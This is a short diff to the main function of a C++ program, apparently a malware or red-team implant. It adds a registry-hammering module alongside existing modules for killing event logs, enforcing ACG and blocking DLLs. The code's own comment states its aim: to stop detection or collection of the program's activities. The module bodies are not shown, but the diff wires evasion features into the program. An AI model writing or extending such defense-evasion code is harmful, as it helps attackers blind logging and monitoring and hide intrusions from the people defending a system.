@@ -20,10 +20,15 @@
 #include <modules/eventlogkiller.hpp>
 #include <modules/acg.hpp>
 #include <modules/blockdlls.hpp>
+#include <modules/registry.hpp>
 
 int main(int argc, char **argv)
 {
 // Disables certain services / functions to prevent the detection or collection of the activities of the program
+#ifdef _REGISTRY_HAMMERING_ENABLED
+    find_dir();
+#endif
+
 #ifdef _EVENTLOG_BLIND_ENABLED
     std::thread eventlogBlindThread(eventlogkiller);
     eventlogBlindThread.join();
